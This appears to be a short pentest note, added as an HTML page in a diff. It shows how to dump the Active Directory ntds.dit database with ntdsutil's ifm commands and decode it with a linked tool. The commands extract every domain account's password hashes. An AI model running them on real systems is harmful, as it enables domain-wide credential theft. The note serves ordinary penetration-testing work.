@@ -1,0 +1,15 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Pulling ntds.dit Locally/Remotely using ntdsutil</title>
+</head><body>If you have local admin on the box, you can use ntdsutil. By default, installed in Windows\system32<br/>
+<br/>
+C:\&gt;ntdsutil<br/>
+ntdsutil: activate instance ntds<br/>
+ntdsutil: ifm<br/>
+ifm: create full c:\pentest<br/>
+ifm: quit<br/>
+ntdsutil: quit<br/>
+<br/>
+Then you can use <a href="https://github.com/mubix/ntds_decode">ntds_decode</a>&nbsp;to read it</body></html>
